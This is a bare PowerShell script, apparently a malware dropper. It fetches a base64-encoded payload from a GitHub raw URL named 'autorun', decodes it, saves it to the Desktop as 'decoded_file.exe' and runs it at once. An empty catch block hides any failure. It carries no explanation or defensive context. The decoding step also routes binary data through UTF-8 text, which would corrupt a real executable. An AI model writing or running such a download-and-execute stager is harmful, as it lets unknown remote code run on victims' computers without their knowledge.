$url = "https://raw.githubusercontent.com/photosimages/autorun/main/zuez"
$desktopPath = [System.Environment]::GetFolderPath("Desktop")
$savePath = Join-Path -Path $desktopPath -ChildPath "decoded_file.exe"

try {
    $webClient = New-Object System.Net.WebClient
    $encodedString = $webClient.DownloadString($url)

    $decodedBytes = [System.Convert]::FromBase64String($encodedString)
    $decodedText = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
    Set-Content -Path $savePath -Value $decodedText -Encoding UTF8
    Start-Process -FilePath $savePath
}
catch {
}
